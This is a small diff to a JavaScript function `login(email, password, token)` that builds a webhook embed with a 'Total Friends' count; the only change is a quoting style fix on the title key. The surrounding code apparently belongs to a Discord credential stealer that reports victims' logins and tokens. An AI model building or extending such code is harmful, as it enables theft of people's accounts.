@@ -605,7 +605,7 @@ const login = async (email, password, token) => {
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
-    "title": `Total Friends (${friends})`,
+    title: `Total Friends (${friends})`,
     embeds: [
       {
         color: config.embed_color,
